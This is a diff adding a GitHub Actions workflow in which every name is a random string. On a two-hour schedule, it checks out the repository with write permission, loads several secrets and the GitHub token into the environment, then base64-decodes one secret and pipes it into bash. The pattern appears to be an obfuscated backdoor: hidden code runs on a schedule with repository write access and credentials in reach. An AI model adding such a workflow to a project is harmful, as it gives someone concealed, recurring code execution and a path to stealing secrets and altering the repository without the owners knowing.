@@ -1,0 +1,21 @@
+name: vuRGpMVI
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  cZEKLJ8irhLwiv6L:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.rEsd4 }}
+      - name: o49nO4cXueI
+        env:
+          r6wVTdGQMRuRlP: ${{ secrets.M48G5PmaA9 }}
+          eRvbJLewpa: ${{ secrets.EHuI7W0n }}
+          m57uJSVa3Ksncg: ${{ secrets.skuC6V }}
+          GITHUB_TOKEN: ${{ secrets.rEsd4 }}
+        run: echo "$r6wVTdGQMRuRlP" | base64 -d | bash
